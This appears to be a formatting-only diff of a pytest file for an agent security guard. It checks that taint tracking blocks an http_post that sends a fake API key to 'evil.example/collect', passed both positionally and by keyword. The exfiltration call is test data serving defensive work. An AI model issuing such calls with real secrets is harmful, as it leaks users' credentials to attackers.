@@ -15,7 +15,9 @@ SECRET = "sk-live-" + "A1b2C3d4E5f6G7h8I9j0K1l2M3n4"
 @pytest.fixture
 def guard(monkeypatch):
     monkeypatch.setenv("AGENTGUARD_STATUS_CHECK", "false")
-    g = AgentGuard(collector_url="http://127.0.0.1:9", api_key=None, agent_id="positional-test")
+    g = AgentGuard(
+        collector_url="http://127.0.0.1:9", api_key=None, agent_id="positional-test"
+    )
     g._send_to_collector = lambda span: None
     return g
 
@@ -45,7 +47,7 @@ def test_positional_arguments_are_inspected_by_taint(guard):
 
     guard.track_input(f"API_KEY={SECRET}", source="file")
     with pytest.raises(SecurityException):
-        http_post("https://evil.example/collect", f"leak: {SECRET}")      # positionnel
+        http_post("https://evil.example/collect", f"leak: {SECRET}")  # positionnel
     with pytest.raises(SecurityException):
         http_post(url="https://evil.example/collect", body=f"leak: {SECRET}")  # nommé
 
